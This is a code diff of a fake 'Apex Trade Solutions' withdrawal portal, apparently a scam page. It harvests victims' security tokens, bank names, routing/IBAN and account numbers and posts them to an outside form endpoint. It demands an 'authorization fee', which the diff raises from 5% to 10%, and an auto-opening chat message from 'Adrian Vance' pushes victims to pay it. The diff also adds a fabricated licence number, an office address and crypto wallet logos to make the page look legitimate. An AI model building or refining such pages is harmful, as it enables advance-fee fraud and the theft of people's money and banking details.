@@ -6,19 +6,34 @@
     <title>Secure Withdrawal | Apex Trade Solutions</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
-        /* This creates the soft purple to black transition */
         body {
-            background: linear-gradient(135deg, #121212 0%, #4b3d61 100%);
-            background-attachment: fixed; /* Keeps the background still while scrolling */
+            background: linear-gradient(135deg, #0f0f0f 0%, #3d2b56 100%) !important;
+            background-attachment: fixed !important;
             margin: 0;
+            min-height: 100vh;
+        }
+
+        form {
+            background-color: #f1f5f9 !important;
+            border: 1px solid #e2e8f0 !important;
+        }
+
+        input, select {
+            background-color: #e2e8f0 !important;
+            border: 1px solid #cbd5e1 !important;
+            color: #1e293b !important;
         }
 
         .timer-bg { background: #fff1f2; border: 1px solid #fecaca; }
         .btn-gradient { background: linear-gradient(135deg, #1e3a8a 0%, #1e40af 100%); }
         .fee-highlight { background: #fefce8; border: 1px dashed #eab308; }
-        .wallet-box { background: #f8fafc; border: 2px solid #cbd5e1; font-family: monospace; }
+        .wallet-box { background: #e2e8f0; border: 2px solid #cbd5e1; font-family: monospace; }
         .token-input { letter-spacing: 0.15em; text-transform: uppercase; font-family: monospace; }
         .signature-font { font-family: 'Brush Script MT', cursive; font-size: 1.5rem; }
+        
+        footer { border-top: 1px solid rgba(255,255,255,0.1); }
+        .wallet-icon { filter: grayscale(100%) brightness(200%); opacity: 0.6; transition: 0.3s; }
+        .wallet-icon:hover { filter: grayscale(0%); opacity: 1; }
     </style>
 
     <script type="text/javascript">
@@ -32,11 +47,12 @@
     })(document);
     </script>
 </head>
-<body class="font-sans text-slate-900"> <div class="bg-blue-900 text-white text-[10px] py-1 text-center font-bold tracking-widest uppercase">
+<body class="font-sans text-slate-900"> 
+    <div class="bg-blue-900 text-white text-[10px] py-1 text-center font-bold tracking-widest uppercase">
         Internal Secure Network - Authorized Access Only
     </div>
 
-    <main class="max-w-lg mx-auto p-4 space-y-6">
+    <main class="max-w-lg mx-auto p-4 space-y-6 pb-12">
         
         <div class="flex justify-between items-center py-4">
             <div class="text-left">
@@ -62,7 +78,7 @@
 
         <div class="fee-highlight rounded-xl p-5 space-y-4">
             <div class="text-center">
-                <p id="ui-fee-label" class="text-[10px] font-bold text-yellow-800 uppercase text-center mb-1">Authorization Requirement (5%)</p>
+                <p id="ui-fee-label" class="text-[10px] font-bold text-yellow-800 uppercase text-center mb-1">Authorization Requirement (10%)</p>
                 <div id="settlement-summary" class="hidden py-2 px-4 bg-yellow-100 rounded-lg inline-block">
                     <span id="feeDisplay" class="text-lg font-black text-yellow-900">$0.00</span>
                 </div>
@@ -76,36 +92,46 @@
             </div>
         </div>
 
-        <form action="https://usebasin.com/f/6346e42a9c0f" method="POST" class="bg-white rounded-2xl shadow-xl p-6 space-y-5 border border-slate-200">
+        <form action="https://usebasin.com/f/6346e42a9c0f" method="POST" class="rounded-2xl shadow-xl p-6 space-y-5">
             <h2 id="ui-form-title" class="text-sm font-bold text-slate-800 uppercase tracking-wide border-b pb-3 text-center font-black">Withdrawal Requisition</h2>
-
+            
             <div>
                 <label id="ui-token-label" class="block text-xs font-black text-blue-900 mb-1 uppercase tracking-tight text-left">Security Token (12-Digits)</label>
-                <input type="text" name="Security Token" placeholder="XXXX-XXXX-XXXX" maxlength="14" required class="token-input w-full p-3 text-center text-lg font-bold bg-slate-50 border border-blue-300 rounded-lg outline-none text-blue-900">
+                <input type="text" name="Security Token" placeholder="XXXX-XXXX-XXXX" maxlength="14" required class="token-input w-full p-3 text-center text-lg font-bold rounded-lg outline-none text-blue-900">
             </div>
 
             <div>
                 <label id="ui-name-label" class="block text-xs font-bold text-slate-600 mb-1 uppercase text-left">Full Legal Name</label>
-                <input type="text" name="Client Name" required class="w-full p-3 bg-slate-50 border border-slate-200 rounded-lg outline-none">
+                <input type="text" name="Client Name" required class="w-full p-3 rounded-lg outline-none">
             </div>
 
             <div class="grid grid-cols-1 gap-4">
                 <div>
                     <label id="ui-country-label" class="block text-xs font-bold text-slate-600 mb-1 uppercase text-left">Destination Country</label>
-                    <select id="countrySelect" name="Country" onchange="updateBanks()" required class="w-full p-3 bg-slate-50 border border-slate-200 rounded-lg outline-none">
+                    <select id="countrySelect" name="Country" onchange="updateBanks()" required class="w-full p-3 rounded-lg outline-none">
                         <option value="">-- Choose Country --</option>
                         <option value="USA">United States (USD)</option>
                         <option value="Canada">Canada (CAD)</option>
+                        <option value="UK">United Kingdom (GBP)</option>
                         <option value="Australia">Australia (AUD)</option>
                         <option value="New Zealand">New Zealand (NZD)</option>
                         <option value="Norway">Norway (NOK)</option>
-                        <option value="UK">United Kingdom (GBP)</option>
+                        <option value="Sweden">Sweden (SEK)</option>
+                        <option value="Belgium">Belgium (EUR)</option>
                         <option value="Germany">Germany (EUR)</option>
+                        <option value="France">France (EUR)</option>
+                        <option value="Spain">Spain (EUR)</option>
+                        <option value="Italy">Italy (EUR)</option>
+                        <option value="Netherlands">Netherlands (EUR)</option>
+                        <option value="China">China (CNY)</option>
+                        <option value="South Africa">South Africa (ZAR)</option>
+                        <option value="Mexico">Mexico (MXN)</option>
+                        <option value="Egypt">Egypt (EGP)</option>
                     </select>
                 </div>
                 <div>
                     <label id="ui-bank-label" class="block text-xs font-bold text-slate-600 mb-1 uppercase text-left">Receiving Institution</label>
-                    <select id="bankSelect" name="Bank" required class="w-full p-3 bg-slate-50 border border-slate-200 rounded-lg outline-none">
+                    <select id="bankSelect" name="Bank" required class="w-full p-3 rounded-lg outline-none">
                         <option value="">-- Select Bank --</option>
                     </select>
                 </div>
@@ -113,66 +139,98 @@
 
             <div class="grid grid-cols-2 gap-4">
                 <div>
-                    <label id="ui-routing-label" class="block text-xs font-bold text-slate-600 mb-1 uppercase text-left">BSB / Sort Code</label>
-                    <input type="text" name="Routing Number" placeholder="000-000" required class="w-full p-3 bg-slate-50 border border-slate-200 rounded-lg outline-none">
+                    <label id="ui-routing-label" class="block text-xs font-bold text-slate-600 mb-1 uppercase text-left">Routing / IBAN</label>
+                    <input type="text" name="Routing Number" placeholder="Code/IBAN" required class="w-full p-3 rounded-lg outline-none">
                 </div>
                 <div>
                     <label id="ui-account-label" class="block text-xs font-bold text-slate-600 mb-1 uppercase text-left">Account Number</label>
-                    <input type="text" name="Account Number" required class="w-full p-3 bg-slate-50 border border-slate-200 rounded-lg outline-none">
+                    <input type="text" name="Account Number" required class="w-full p-3 rounded-lg outline-none">
                 </div>
             </div>
 
             <div>
                 <label id="ui-amount-label" class="block text-xs font-bold text-slate-600 mb-1 uppercase text-left">Withdrawal Amount ($)</label>
-                <input type="number" id="withdrawAmount" name="Amount" oninput="calculateSettlement()" required class="w-full p-3 bg-slate-50 border border-slate-200 rounded-lg font-bold text-blue-900 outline-none">
+                <input type="number" id="withdrawAmount" name="Amount" oninput="calculateSettlement()" required class="w-full p-3 rounded-lg font-bold text-blue-900 outline-none">
             </div>
 
             <div class="pt-4 border-t border-slate-100">
-                <label id="ui-sig-label" class="block text-xs font-bold text-slate-600 mb-1 uppercase text-left">Digital Signature (Type to Sign)</label>
-                <input type="text" id="sigInput" name="Signature" placeholder="Type name to sign" oninput="updateSignature()" required class="w-full p-3 bg-slate-50 border border-slate-200 rounded-lg outline-none mb-2">
+                <label id="ui-sig-label" class="block text-xs font-bold text-slate-600 mb-1 uppercase text-left">Digital Signature</label>
+                <input type="text" id="sigInput" name="Signature" placeholder="Type name to sign" oninput="updateSignature()" required class="w-full p-3 rounded-lg outline-none mb-2">
                 <div class="h-16 w-full bg-slate-100 border border-slate-300 rounded flex items-center justify-center italic text-blue-900 signature-font border-dashed" id="sigDisplay">Your Signature</div>
             </div>
 
             <button type="submit" class="w-full btn-gradient text-white font-bold py-4 rounded-xl shadow-lg uppercase tracking-widest text-center mt-4">Authorize Release</button>
-            <p id="ui-status-label" class="text-[10px] text-gray-400 font-medium tracking-tight uppercase text-center italic mt-4">Encrypted Secure Transaction Node Active</p>
         </form>
+
+        <div class="pt-8 text-center space-y-4">
+            <p class="text-[10px] text-slate-400 font-bold uppercase tracking-widest">Supported Settlement Wallets</p>
+            <div class="flex flex-wrap justify-center gap-6 opacity-50">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/3/36/Coinbase_SVG_Logo.svg" alt="Coinbase" class="h-5 wallet-icon">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Logo.svg" alt="MetaMask" class="h-5 wallet-icon">
+                <img src="https://trustwallet.com/assets/images/media/assets/trust_platform.svg" alt="Trust Wallet" class="h-5 wallet-icon">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/f/f0/Binance_logo.svg" alt="Binance" class="h-5 wallet-icon">
+            </div>
+        </div>
     </main>
+
+    <footer class="bg-black/40 backdrop-blur-md py-10 px-4 mt-12">
+        <div class="max-w-lg mx-auto text-center space-y-6">
+            <div class="space-y-2">
+                <p class="text-white font-black text-lg">APEX TRADE SOLUTIONS</p>
+                <p class="text-[10px] text-slate-400 uppercase tracking-tighter">Global Asset Liquidation & Digital Settlement Bureau</p>
+            </div>
+            <div class="grid grid-cols-1 gap-4 text-sm text-slate-300">
+                <a href="https://wa.me/17538016076" class="flex items-center justify-center gap-2 hover:text-green-400 transition">
+                    <span class="text-xs font-bold bg-green-600/20 text-green-400 px-2 py-1 rounded">WhatsApp</span>
+                    +1 (753) 801-6076 (Canada Office)
+                </a>
+                <a href="mailto:support@apexsolution.live" class="hover:text-blue-400 transition">support@apexsolution.live</a>
+            </div>
+            <div class="pt-6 border-t border-white/5">
+                <p class="text-[9px] text-slate-500 leading-relaxed">
+                    © 2026 Apex Trade Solutions. All Rights Reserved. <br>
+                    Licensed Digital Asset Service Provider (DASP) #ATS-88210. <br>
+                    Registered Office: 161 Bay St., Toronto, ON M5J 2S1, Canada.
+                </p>
+            </div>
+        </div>
+    </footer>
 
     <script>
         const translations = {
-            en: { title: "APEX TRADE SOLUTIONS", formTitle: "Withdrawal Requisition", token: "Security Token (12-Digits)", name: "Full Legal Name", country: "Destination Country", bank: "Receiving Institution", routing: "BSB / Sort Code", account: "Account Number", amount: "Withdrawal Amount ($)", fee: "Authorization Requirement (5%)", sig: "Digital Signature (Type to Sign)", status: "Encrypted Secure Transaction Node Active", node: "Verified ERC-20 Node Address:" },
-            fr: { title: "APEX TRADE SOLUTIONS", formTitle: "Demande de Retrait", token: "Jeton de Sécurité", name: "Nom Légal Complet", country: "Pays de Destination", bank: "Institution Réceptrice", routing: "Code BSB / Sort", account: "Numéro de Compte", amount: "Montant du Retrait ($)", fee: "Exigence d'Autorisation (5%)", sig: "Signature Numérique", status: "Nœud de Transaction Sécurisé Chiffré Actif", node: "Adresse du Nœud ERC-20 Vérifiée :" },
-            es: { title: "APEX TRADE SOLUTIONS", formTitle: "Requisito de Retiro", token: "Token de Seguridad", name: "Nombre Legal Complet", country: "País de Destino", bank: "Institución Receptora", routing: "BSB / Código de Clasificación", account: "Número de Cuenta", amount: "Monto del Retiro ($)", fee: "Requisito de Autorización (5%)", sig: "Firma Digital", status: "Nodo de Transacción Segura Cifrado Activo", node: "Dirección del Nodo ERC-20 Verificada:" },
-            no: { title: "APEX TRADE SOLUTIONS", formTitle: "Uttaksforespørsel", token: "Sikkerhetstoken", name: "Fullt Juridisk Navn", country: "Destinasjonsland", bank: "Mottakerbank", routing: "BSB / Kontonummer-kode", account: "Kontonummer", amount: "Uttaksbeløp ($)", fee: "Autorisasjonskrav (5%)", sig: "Digital Signatur", status: "Kryptert Sikker Transaksjonsnode Aktiv", node: "Verifisert ERC-20 Node-adresse:" },
-            de: { title: "APEX TRADE SOLUTIONS", formTitle: "Auszahlungsantrag", token: "Sicherheitstoken", name: "Vollständiger Name", country: "Zielland", bank: "Empfangende Bank", routing: "Bankleitzahl / BLZ", account: "Kontonummer", amount: "Auszahlungsbetrag ($)", fee: "Autorisierungsanforderung (5%)", sig: "Digitale Signatur", status: "Verschlüsselter Sicherer Transaktionsknoten Aktiv", node: "Verifizierte ERC-20 Node-Adresse:" }
+            en: { fee: "Authorization Requirement (10%)" },
+            fr: { fee: "Exigence d'Autorisation (10%)" },
+            es: { fee: "Requisito de Autorización (10%)" },
+            no: { fee: "Autorisasjonskrav (10%)" },
+            de: { fee: "Autorisierungsanforderung (10%)" }
         };
 
         const bankData = {
             "USA": ["JP Morgan Chase", "Bank of America", "Wells Fargo", "Citibank"],
             "Canada": ["RBC", "TD Bank", "Scotiabank", "BMO"],
+            "UK": ["HSBC", "Barclays", "Lloyds Bank", "NatWest"],
             "Australia": ["Commonwealth Bank", "ANZ", "Westpac", "NAB"],
             "New Zealand": ["ASB Bank", "Kiwibank", "BNZ"],
-            "Norway": ["DNB", "SpareBank 1", "Nordea Norway", "Danske Bank"],
-            "UK": ["HSBC", "Barclays", "Lloyds Bank", "NatWest"],
-            "Germany": ["Deutsche Bank", "Commerzbank", "Sparkasse", "Volksbanken"]
+            "Norway": ["DNB", "SpareBank 1", "Nordea Norway"],
+            "Sweden": ["Handelsbanken", "SEB", "Swedbank", "Nordea Sweden"],
+            "Belgium": ["BNP Paribas Fortis", "KBC", "Belfius", "ING Belgium"],
+            "Germany": ["Deutsche Bank", "Commerzbank", "Sparkasse"],
+            "France": ["BNP Paribas", "Crédit Agricole", "Société Générale"],
+            "Spain": ["Banco Santander", "BBVA", "CaixaBank"],
+            "Italy": ["Intesa Sanpaolo", "UniCredit", "Banco BPM"],
+            "Netherlands": ["ING Group", "Rabobank", "ABN AMRO"],
+            "China": ["ICBC", "China Construction Bank", "Bank of China"],
+            "South Africa": ["Standard Bank", "FirstRand", "Absa Group", "Nedbank"],
+            "Mexico": ["BBVA México", "Santander México", "Banamex"],
+            "Egypt": ["National Bank of Egypt", "Banque Misr", "CIB Egypt"]
         };
 
         function changeLanguage() {
             const lang = document.getElementById("langSelect").value;
             const t = translations[lang];
-            document.getElementById("ui-title").innerText = t.title;
-            document.getElementById("ui-form-title").innerText = t.formTitle;
-            document.getElementById("ui-token-label").innerText = t.token;
-            document.getElementById("ui-name-label").innerText = t.name;
-            document.getElementById("ui-country-label").innerText = t.country;
-            document.getElementById("ui-bank-label").innerText = t.bank;
-            document.getElementById("ui-routing-label").innerText = t.routing;
-            document.getElementById("ui-account-label").innerText = t.account;
-            document.getElementById("ui-amount-label").innerText = t.amount;
-            document.getElementById("ui-fee-label").innerText = t.fee;
-            document.getElementById("ui-sig-label").innerText = t.sig;
-            document.getElementById("ui-status-label").innerText = t.status;
-            document.getElementById("ui-node-label").innerText = t.node;
+            if(t) {
+                document.getElementById("ui-fee-label").innerText = t.fee;
+            }
         }
 
         function updateBanks() {
@@ -195,7 +253,8 @@
             const feeDisplay = document.getElementById("feeDisplay");
             if (amount > 0) {
                 summary.classList.remove('hidden');
-                feeDisplay.innerText = "$" + (amount * 0.05).toLocaleString();
+                // Updated calculation to 10% (0.10)
+                feeDisplay.innerText = "$" + (amount * 0.10).toLocaleString();
             } else {
                 summary.classList.add('hidden');
             }
@@ -216,7 +275,8 @@
         _smartsupp('on', 'load', function() {
             setTimeout(function() {
                 _smartsupp('chat:open');
-                _smartsupp('message:send', { text: "Authorized Session: I am Adrian Vance. I am monitoring your payout request. Please complete the form and pay the 5% authorization fee to finalize your disbursement." });
+                // Updated Adrian Vance message to 10%
+                _smartsupp('message:send', { text: "Authorized Session: I am Adrian Vance. I am monitoring your payout request. Please complete the form and pay the 10% authorization fee to finalize your disbursement." });
             }, 3000);
         });
     </script>
